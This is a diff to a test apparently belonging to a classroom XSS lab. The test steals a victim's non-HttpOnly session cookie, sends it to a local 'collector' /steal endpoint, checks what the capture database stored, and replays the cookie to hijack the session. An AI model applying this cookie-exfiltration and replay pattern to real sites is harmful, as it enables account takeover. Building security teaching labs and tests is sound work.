@@ -7,7 +7,11 @@ def test_real_lab_session_hijack(apps):
     stolen=victim.get_cookie('xss_lab_session').value
     assert not victim.get_cookie('xss_lab_session').http_only
     collector=apps['collector'].test_client()
-    collector.get('/steal',query_string={'cookie':'xss_lab_session='+stolen})
+    collector.get('/steal',query_string={'cookie':'fake_session=XSS-CLASSROOM-ONLY; xss_lab_session='+stolen,'username':'wrong-name'})
+    with lab.db() as db:
+        capture=db.execute('SELECT * FROM captures').fetchone()
+        assert capture['username']=='pony'
+        assert capture['content']=='xss_lab_session='+stolen
     login(collector,'alice')
     assert stolen in collector.get('/').text
     student.set_cookie('xss_lab_session',stolen)
